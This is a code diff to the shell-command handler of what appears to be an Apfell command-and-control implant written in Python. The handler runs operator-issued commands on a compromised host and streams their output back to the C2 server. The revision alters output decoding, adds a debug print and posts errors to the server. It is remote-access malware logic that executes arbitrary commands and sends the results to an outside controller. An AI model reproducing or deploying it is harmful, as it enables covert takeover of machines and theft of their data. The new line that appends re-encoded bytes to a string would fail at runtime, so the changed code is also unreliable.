@@ -8,7 +8,7 @@ def shell(apfell, c2, params="whoami", task_id=-1):
         return
     # execute a shell command and stream the output back to the apfell server as necessary
     try:
-        process = subprocess.Popen(params, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+        process = subprocess.Popen(params, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, universal_newlines=False)
     except Exception as e:
         c2.post_response(response="Failed to start process", task_id=task_id)
         apfell.remove_job(task_id)
@@ -16,11 +16,12 @@ def shell(apfell, c2, params="whoami", task_id=-1):
         try:
             output = ""
             timeout = time.time() + c2.get_wait_time()
-            for line in iter(process.stdout.readline, ''):
-                output += line.decode('utf-8')
+            for line in iter(process.stdout.read, b''):
+                output += line.decode('utf-8').encode('utf-8')
                 if time.time() > timeout:
                     break
             if output != "":
+                print("trying to post output")
                 c2.post_response(response=output, task_id=task_id)
             process.poll()
             if process.returncode is not None:
@@ -36,7 +37,8 @@ def shell(apfell, c2, params="whoami", task_id=-1):
                 exit()
             c2.wait()
         except Exception as e:
-            print("Exiting thread due to: {}\n".format(str(e)))
+            c2.post_response(response="Error return code {}, Exiting thread due to: {}\n".format(process.returncode, str(e)), task_id=task_id)
+            #print("Exiting thread due to: {}\n".format(str(e)))
             break   
     apfell.remove_job(task_id)
 COMMAND_ENDS_HERE
